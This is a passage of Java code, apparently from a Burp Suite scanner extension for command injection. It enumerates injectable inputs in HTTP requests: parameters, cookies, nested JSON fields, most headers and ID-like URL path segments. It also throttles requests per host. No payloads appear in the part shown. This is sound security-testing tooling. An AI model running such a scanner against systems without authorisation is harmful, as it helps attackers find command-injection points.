                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new CmdiTarget(param.name(), param.value(), CmdiTargetType.COOKIE));
                    break;
            }
        }
        // JSON body params (recursive for nested objects)
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonParams(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        // Extract ALL injectable request headers (skip non-injectable framework headers)
        Set<String> skipHeaders = Set.of("host", "content-length", "connection", "accept-encoding",
                "sec-fetch-mode", "sec-fetch-site", "sec-fetch-dest", "sec-fetch-user",
                "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
                "upgrade-insecure-requests", "if-modified-since", "if-none-match",
                "cookie"); // individual cookies already extracted as COOKIE parameters
        for (var h : request.headers()) {
            if (!skipHeaders.contains(h.name().toLowerCase())) {
                targets.add(new CmdiTarget(h.name(), h.value(), CmdiTargetType.HEADER));
            }
        }

        // URL path segments — API endpoints like /api/users/12 where 12 may be passed to OS commands
        if (config.getBool("cmdi.pathSegments.enabled", true)) {
            extractPathSegmentTargets(request, targets);
        }

        return targets;
    }

    /**
     * Recursively extract JSON parameters using dot-notation for nested objects.
     */
    private void extractJsonParams(com.google.gson.JsonObject obj, String prefix, List<CmdiTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && (val.getAsJsonPrimitive().isString() || val.getAsJsonPrimitive().isNumber())) {
                targets.add(new CmdiTarget(fullKey, val.getAsString(), CmdiTargetType.JSON));
            } else if (val.isJsonObject()) {
                extractJsonParams(val.getAsJsonObject(), fullKey, targets);
            }
        }
    }

    // Common route words to skip when extracting path segment targets
    private static final Set<String> COMMON_ROUTE_WORDS = Set.of(
            "api", "v1", "v2", "v3", "v4", "search", "users", "admin", "static", "assets",
            "css", "js", "img", "public", "login", "logout", "register", "profile",
            "settings", "dashboard", "results", "page", "index", "home", "about",
            "contact", "auth", "oauth", "callback", "webhook", "health", "status",
            "docs", "help", "faq", "terms", "privacy", "legal", "blog", "news",
            "feed", "rss", "sitemap", "robots", "favicon", "manifest"
    );

    /**
     * Extract the last URL path segment as a command injection target.
     * Only targets API-style endpoints (e.g., /api/users/12, /api/files/report).
     * Skips regular page URLs ending in file extensions like .html, .php, .jsp, etc.
     */
    private void extractPathSegmentTargets(HttpRequest request, List<CmdiTarget> targets) {
        try {
            String path = extractPath(request.url());
            if (path == null || path.length() < 2) return;

            // Skip URLs that end with a page/static file extension — not API endpoints
            if (path.matches(".*\\.(html|htm|php|asp|aspx|jsp|jspx|css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|pdf|xml|txt)$")) return;

            String[] segments = path.split("/");

            // Find the last non-empty segment
            int lastIdx = -1;
            String lastSegment = null;
            for (int i = segments.length - 1; i >= 0; i--) {
                String seg = segments[i].trim();
                if (!seg.isEmpty()) {
                    lastIdx = i;
                    lastSegment = seg;
                    break;
                }
            }
            if (lastIdx < 0 || lastSegment == null) return;

            // Skip if last segment is a common route word (not a user-controlled value)
            if (COMMON_ROUTE_WORDS.contains(lastSegment.toLowerCase())) return;

            // The last segment should look like a parameter value (ID, UUID, slug)
            boolean isNumeric = lastSegment.matches("^\\d+$");
            boolean isUuid = lastSegment.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
            boolean isAlphanumericId = lastSegment.matches("^[a-zA-Z0-9_-]+$") && lastSegment.length() >= 3;

            if (isNumeric || isUuid || isAlphanumericId) {
                String targetName = "path:" + lastIdx + ":" + lastSegment;
                targets.add(new CmdiTarget(targetName, lastSegment, CmdiTargetType.PATH_SEGMENT));
            }
        } catch (Exception e) {
            api.logging().logToError("[CmdI] Path segment extraction failed: " + e.getMessage());
        }
    }

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("cmdi.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    private enum CmdiTargetType { QUERY, BODY, COOKIE, JSON, HEADER, PATH_SEGMENT }

    private static class CmdiTarget {
        final String name, originalValue;
        final CmdiTargetType type;
        CmdiTarget(String n, String v, CmdiTargetType t) { name = n; originalValue = v != null ? v : ""; type = t; }
    }

}
